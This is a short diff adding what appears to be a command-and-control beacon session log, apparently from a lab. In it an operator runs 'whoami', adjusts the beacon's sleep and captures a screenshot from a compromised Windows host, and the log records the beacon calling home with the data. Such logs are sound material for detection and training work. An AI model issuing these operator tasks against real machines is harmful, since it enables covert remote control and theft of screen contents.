@@ -1,0 +1,17 @@
+11/09 22:07:34 UTC [metadata] 192.168.1.157 <- 192.168.1.157; computer: DESKTOP-PVRVG16; user: Deviant; process: beacon_x64.exe; pid: 6616; os: Windows; version: 6.2; build: 9200; beacon arch: x64 (x64)
+11/09 22:09:36 UTC [input] <neo> shell whoami
+11/09 22:09:36 UTC [task] <T1059> Tasked beacon to run: whoami
+11/09 22:09:50 UTC [input] <neo> sleep 10
+11/09 22:09:50 UTC [task] <T1029> Tasked beacon to sleep for 10s
+11/09 22:10:24 UTC [checkin] host called home, sent: 53 bytes
+11/09 22:10:24 UTC [output]
+received output:
+desktop-pvrvg16\deviant
+
+
+11/09 22:13:55 UTC [input] <neo> screenshot
+11/09 22:13:55 UTC [task] <T1113, T1093> Tasked beacon to take screenshot
+11/09 22:14:05 UTC [checkin] host called home, sent: 199988 bytes
+11/09 22:14:06 UTC [output]
+received screenshot of Windows PowerShell from Deviant (277kb)
+
